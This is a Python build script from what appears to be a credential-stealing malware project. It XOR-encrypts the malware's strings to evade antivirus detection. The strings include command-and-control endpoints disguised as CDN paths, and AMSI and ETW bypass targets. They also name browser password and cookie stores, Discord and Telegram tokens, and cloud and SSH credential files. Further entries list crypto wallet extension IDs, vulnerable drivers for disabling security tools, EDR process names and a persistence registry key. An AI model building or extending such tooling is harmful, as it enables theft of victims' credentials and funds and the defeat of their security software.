#!/usr/bin/env python3
"""
gen_full_strings.py — Re-generate ares_strings.h with a new XOR key.

Usage:
    python3 tools/gen_full_strings.py --key 0xNN [--randomize-paths]

Output: agent/native/ares_strings.h (overwrite)
"""
import argparse, sys, os, random, string, json

# v3.3: CDN-looking path prefixes for endpoint randomization
PATH_PREFIXES = [
    "/cdn/assets/v2", "/static/js", "/wp-content/uploads",
    "/media/img", "/res/fonts", "/dist/css", "/assets/vendor",
]
PATH_ACTIONS = {
    "C2_REGISTER": ["init", "setup", "handshake", "sync", "connect"],
    "C2_BEACON":   ["poll", "check", "ping", "heartbeat", "status"],
    "C2_EXFIL":    ["upload", "submit", "post", "send", "push"],
    "C2_RESULT":   ["callback", "report", "ack", "confirm", "done"],
}

def gen_random_path(action_key):
    """Generate a CDN-looking random path for a C2 endpoint."""
    prefix = random.choice(PATH_PREFIXES)
    action = random.choice(PATH_ACTIONS[action_key])
    rand_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{prefix}/{action}_{rand_suffix}"

# ── All plaintext strings keyed by macro name ──
STRINGS = {
    # C2 endpoints (default — overridden if --randomize-paths)
    "C2_IP_0":        "127.0.0.1",
    "C2_REGISTER":    "/api/v1/register",
    "C2_BEACON":      "/api/v1/beacon",
    "C2_EXFIL":       "/api/v1/exfil",
    "C2_RESULT":      "/api/v1/result",
    # HTTP headers
    "USER_AGENT":     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "CONTENT_TYPE":   "application/json; charset=utf-8",
    # System DLLs
    "NTDLL":          "ntdll.dll",
    "KERNEL32":       "kernel32.dll",
    "AMSI_DLL":       "amsi.dll",
    "AMSI_SCAN":      "AmsiScanBuffer",
    "ETW_WRITE":      "EtwEventWrite",
    "WINHTTP_DLL":    "winhttp.dll",
    "CRYPT32_DLL":    "crypt32.dll",
    "BCRYPT_DLL":     "bcrypt.dll",
    # Browser User Data paths
    "BR_CHROME":      "Google\\Chrome\\User Data",
    "BR_EDGE":        "Microsoft\\Edge\\User Data",
    "BR_BRAVE":       "BraveSoftware\\Brave-Browser\\User Data",
    "BR_OPERA":       "Opera Software\\Opera Stable",
    "BR_VIVALDI":     "Vivaldi\\User Data",
    "LABEL_CHROME":   "Chrome",
    "LABEL_EDGE":     "Edge",
    "LABEL_BRAVE":    "Brave",
    "LABEL_OPERA":    "Opera",
    "LABEL_VIVALDI":  "Vivaldi",
    # Discord paths
    "DISCORD_PATH":      "discord\\Local Storage\\leveldb",
    "DISCORD_CAN_PATH":  "discordcanary\\Local Storage\\leveldb",
    "DISCORD_PTB_PATH":  "discordptb\\Local Storage\\leveldb",
    "LABEL_DISCORD":     "Discord",
    "LABEL_DISCORD_CAN": "DiscordCanary",
    "LABEL_DISCORD_PTB": "DiscordPTB",
    # Telegram
    "TELEGRAM_PATH":  "Telegram Desktop\\tdata",
    "TELEGRAM_TDATA": "tdata",
    # Firefox
    "FF_PROFILES":    "Mozilla\\Firefox\\Profiles",
    "FF_LOGINS":      "logins.json",
    "FF_KEY4":        "key4.db",
    # Misc
    "PIPE_NAME":      "\\\\.\\pipe\\msedge_crashpad_handler",
    "REG_RUN_KEY":    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    # Chrome executable paths
    "CHROME_EXE_PATH":   "Google\\Chrome\\Application\\chrome.exe",
    "EDGE_EXE_PATH":     "Microsoft\\Edge\\Application\\msedge.exe",
    "BRAVE_EXE_PATH":    "BraveSoftware\\Brave-Browser\\Application\\brave.exe",
    # Chrome User Data dirs (for stealer)
    "CHROME_USERDATA":   "Google\\Chrome\\User Data",
    "EDGE_USERDATA":     "Microsoft\\Edge\\User Data",
    "BRAVE_USERDATA":    "BraveSoftware\\Brave-Browser\\User Data",
    # DB filenames
    "CHROME_COOKIE_DB":  "Cookies",
    "EDGE_COOKIE_DB":    "Cookies",
    "BRAVE_COOKIE_DB":   "Cookies",
    "LOCAL_STATE":       "Local State",
    "LOGIN_DATA":        "Login Data",
    "COOKIES":           "Cookies",
    "NETWORK_COOKIES":   "Network\\Cookies",
    "COOKIES_JSON":      "cookies.json",
    "PASSWORDS_JSON":    "passwords.json",
    "ENCRYPTED_KEY":     "encrypted_key",
    "DPAPI":             "DPAPI",
    # Chrome profile names
    "DEFAULT":           "Default",
    "PROF_1":            "Profile 1",
    "PROF_2":            "Profile 2",
    "PROF_3":            "Profile 3",
    "PROF_4":            "Profile 4",
    "PROF_5":            "Profile 5",
    "DEFAULT_LOGIN":     "Default\\Login Data",
    "DEFAULT_LOGIN_J":   "Default/Login Data",
    "DEFAULT_COOKIES":   "Default\\Cookies",
    "DEFAULT_COOKIES_J": "Default/Cookies",
    # CDP / Chrome DevTools flags
    "CDP_HEADLESS_FLAGS":  "--headless=new --remote-debugging-port=",
    "CDP_NO_FIRST":        "--no-first-run --disable-gpu",
    "CDP_WS_KEY":          "webSocketDebuggerUrl",
    "CDP_GET_COOKIES":     "Network.getAllCookies",
    "REMOTE_DEBUG_PORT":   "--remote-debugging-port=",
    "USER_DATA_DIR":       "--user-data-dir=",
    "LOAD_EXTENSION":      "--load-extension=",
    "WINDOW_POS":          "--window-position=0,0",
    "WINDOW_SIZE":         "--window-size=1,1",
    "DISABLE_BG_NET":      "--disable-background-networking",
    "DISABLE_SYNC":        "--disable-sync",
    "NO_DEFAULT_BROWSER":  "--no-default-browser-check",
    "DISABLE_FEATURES":    "--disable-features=TranslateUI",
    # Elevation
    "CHROMELEVATOR_EXE":   "chromelevator_x64.exe",
    "CMD_RMDIR":           "cmd.exe /c rmdir /s /q ",
    "STATUS_V20_BLOCKED":  "BLOCKED_V20",
    "LOCAL_EXT_SET":       "extensions_settings",
    # Cloud credential paths (flagged by AV)
    "CLOUD_AWS_CREDS":    "\\.aws\\credentials",
    "CLOUD_AWS_CFG":      "\\.aws\\config",
    "CLOUD_SSH_RSA":      "\\.ssh\\id_rsa",
    "CLOUD_SSH_ED":       "\\.ssh\\id_ed25519",
    "CLOUD_AZURE":        "\\.azure\\accessTokens.json",
    "CLOUD_GCP":          "\\.config\\gcloud\\credentials.db",
    "CLOUD_KUBE":         "\\.kube\\config",
    "CLOUD_DOCKER":       "\\.docker\\config.json",
    "CLOUD_NPMRC":        "\\.npmrc",
    "CLOUD_ENV":          "\\.env",
    "CLOUD_GITCONFIG":    "\\.gitconfig",
    "CLOUD_NGROK":        "\\AppData\\Roaming\\ngrok\\ngrok.yml",
    "LABEL_AWS_CREDS":    "AWS Credentials",
    "LABEL_AWS_CFG":      "AWS Config",
    "LABEL_SSH_RSA":      "SSH Private Key",
    "LABEL_SSH_ED":       "SSH ED25519 Key",
    "LABEL_AZURE":        "Azure Tokens",
    "LABEL_GCP":          "GCP Credentials",
    "LABEL_KUBE":         "Kubernetes Config",
    "LABEL_DOCKER":       "Docker Config",
    "LABEL_NPMRC":        "NPM Token",
    "LABEL_ENV":          ".env Secrets",
    "LABEL_GITCONFIG":    "Git Config",
    "LABEL_NGROK":        "Ngrok Token",
    # Exfil JSON keys (flagged by AV stealer signatures)
    "EXFIL_TYPE_PASS":    "passwords",
    "EXFIL_TYPE_COOKIE":  "cookies",
    "EXFIL_TYPE_DISCORD": "discord",
    "EXFIL_TYPE_TELE":    "telegram",
    "EXFIL_TYPE_WALLET":  "wallet",
    "EXFIL_TYPE_CLOUD":   "cloud",
    "EXFIL_TYPE_INTEL":   "intel_summary",
    "EXFIL_KEY_BOTID":    "bot_id",
    "EXFIL_KEY_TYPE":     "type",
    "EXFIL_KEY_COUNT":    "count",
    "EXFIL_KEY_ENTRIES":  "entries",
    "EXFIL_NO_CREDS":     "no_creds",
    # Firefox sensitive strings
    "FF_ENC_USER":        "encryptedUsername",
    "FF_ENC_PASS":        "encryptedPassword",
    "FF_LOGINS_KEY":      "logins",
    "FF_HOSTNAME":        "hostname",
    # BYOVD vulnerable drivers
    "RTCORE64_SYS":  "RTCore64.sys",
    "DBUTIL_SYS":    "dbutil_2_3.sys",
    # Crypto wallet extension IDs
    "WALLET_METAMASK":  "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "WALLET_PHANTOM":   "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "WALLET_COINBASE":  "hnfanknocfeofbddgcijnmhnfnkdnaad",
    "WALLET_TRUST":     "egjidjbpglichdcondbcbdnbeeppgdph",
    "WALLET_BRAVE":     "odbfpeeihdkbihmopkbjmoonfanlbfcl",
    "WALLET_EXODUS":    "aholpfdialjgjfhomihkjbmgjidlcdno",
    "WALLET_KEPLR":     "dmkamcknogkgcdfhhbddcghachkejeap",
    "WALLET_OKX":       "mcohilncbfahbmgdjkbpemcciiolgcge",
    "WALLET_RABBY":     "acmacodkjbdgmoleebolmdjonilkdbch",
    "WALLET_RONIN":     "fnjhmkhhmkbjkkabndcnnogagogbneec",
    "WALLET_SOLFLARE":  "bhhhlbepdkbapadjdnnojkbgioiodbic",
    "WALLET_TRONLINK":  "ibnejdfjmmkpcnlpebklmnkoeoihofec",
    "WALLET_ZERION":    "klghhnkeealcohjjanjjdaeeggmfmlpl",
    "WALLET_BINANCE":   "fhbohimaelbohpjbbldcngcnapndodjp",
    # EDR process names (lengths must match len values in eprocess.c)
    "EDR_DEFENDER":      "MsMpEng.exe",               # 11 ✅
    "EDR_DEFENDER_ATP":  "MsSense.exe",               # 11 ✅
    "EDR_DEFENDER_IR":   "SenseIR.exe",               # 11 ✅
    "EDR_DEFENDER_NDR":  "SenseNdr.exe",              # 12 ✅
    "EDR_CROWDSTRIKE":   "CSFalconService",           # 15 ✅
    "EDR_CS_FALCON":     "CSSensorService.exe",       # 19 ✅
    "EDR_CARBON_BLACK":  "cb.exe",                    # 6  ✅
    "EDR_CB_REPMGR":     "RepMgr.exe",               # 10 ✅
    "EDR_CYLANCE":       "CylanceSvc.exe",            # 14 ✅
    "EDR_S1_AGENT":      "SentinelAgent.exe",         # 17 ✅
    "EDR_S1_HOST":       "SentinelAgentWorker.exe",   # 23 ✅
    "EDR_CORTEX":        "CortexXDR.",                # 10 ✅
    "EDR_TRAPS":         "Traps.exe",                 # 9  ✅
    "EDR_FIREEYE":       "xagt.exe",                  # 8  ✅
    "EDR_MCAFEE":        "mfemactl.",                 # 9  ✅
    "EDR_SOPHOS":        "SophosFSx64.ex",            # 14 ✅
    "EDR_SOPHOS_CLEAN":  "SophosCleanM.exe",          # 16 ✅
    "EDR_TRENDMICRO":    "CETASvc.exe         ",      # 20 ✅
    "EDR_SYMANTEC":      "SepMasterService.exe",      # 20 ✅
}


def encode(plaintext: str, key: int) -> list:
    """Rolling XOR: k_i = (key ^ (i*0x13+0x07)) & 0xFF"""
    out = []
    data = plaintext.encode("utf-8")
    for i, b in enumerate(data):
        k = (key ^ ((i * 0x13 + 0x07) & 0xFF)) & 0xFF
        out.append(b ^ k)
    return out


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--key", required=True, help="XOR key e.g. 0xB3 or 179")
    parser.add_argument("--randomize-paths", action="store_true",
                        help="v3.3: Replace /api/v1/* with random CDN-like paths")
    parser.add_argument("--c2-host", default=None,
                        help="Override C2_IP_0 (e.g. 192.168.1.100)")
    args = parser.parse_args()

    key_str = args.key.strip()
    key = int(key_str, 16) if key_str.lower().startswith("0x") else int(key_str)

    if not (0 < key < 256):
        print(f"[!] Key must be 1-255, got {key}", file=sys.stderr)
        sys.exit(1)

    # v3.3: Randomize C2 endpoint paths if requested
    path_map = {}
    if args.randomize_paths:
        for ep_key in ["C2_REGISTER", "C2_BEACON", "C2_EXFIL", "C2_RESULT"]:
            new_path = gen_random_path(ep_key)
            old_path = STRINGS[ep_key]
            STRINGS[ep_key] = new_path
            path_map[old_path] = new_path
            print(f"  [PATH] {ep_key}: {old_path} -> {new_path}")

    if args.c2_host:
        STRINGS["C2_IP_0"] = args.c2_host

    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    out_path = os.path.join(root, "agent", "native", "ares_strings.h")

    # Save path mapping for C2 server
    if path_map:
        map_path = os.path.join(root, "agent", "native", "endpoint_map.json")
        with open(map_path, "w") as f:
            json.dump(path_map, f, indent=2)
        print(f"  [MAP] Saved endpoint map -> {map_path}")

    lines = [
        "/*",
        f" * AUTO-GENERATED -- Encrypted String Constants",
        f" * Mode: rolling | Key: 0x{key:02X} | Strings: {len(STRINGS)}",
        f" * DO NOT EDIT MANUALLY -- regenerate with: python3 tools/gen_full_strings.py --key 0x{key:02X}",
        " */",
        "",
        "#ifndef ARES_STRINGS_H",
        "#define ARES_STRINGS_H",
        "",
        "#include <windows.h>",
        "",
        "/* Rolling XOR decoder -- key injected by build system via -DCFG_XOR_KEY=0xNN */",
        "#ifndef CFG_XOR_KEY",
        "#  pragma message(\"[WARNING] CFG_XOR_KEY not set -- using insecure fallback 0x5A\")",
        "#  define CFG_XOR_KEY 0x5A",
        "#endif",
        "static inline void _xd(char* buf, const BYTE* enc, int len, BYTE key) {",
        "    for (int i = 0; i < len; i++) {",
        "        BYTE k = (key ^ ((BYTE)(i * 0x13 + 0x07))) & 0xFF;",
        "        buf[i] = enc[i] ^ k;",
        "    }",
        "    buf[len] = '\\0';",
        "}",
        "",
    ]

    for name, plaintext in STRINGS.items():
        enc = encode(plaintext, key)
        enc_str = ", ".join(f"0x{b:02X}" for b in enc)
        lines.append(f"static const BYTE ENC_{name}[] = {{{enc_str}}};")
        lines.append(f"#define DEC_{name}(buf) _xd(buf, ENC_{name}, {len(enc)}, CFG_XOR_KEY)")
        lines.append("")

    lines += ["", "#endif /* ARES_STRINGS_H */", ""]

    with open(out_path, "w") as f:
        f.write("\n".join(lines))

    print(f"[+] Generated {out_path} with key=0x{key:02X}, {len(STRINGS)} strings")


if __name__ == "__main__":
    main()
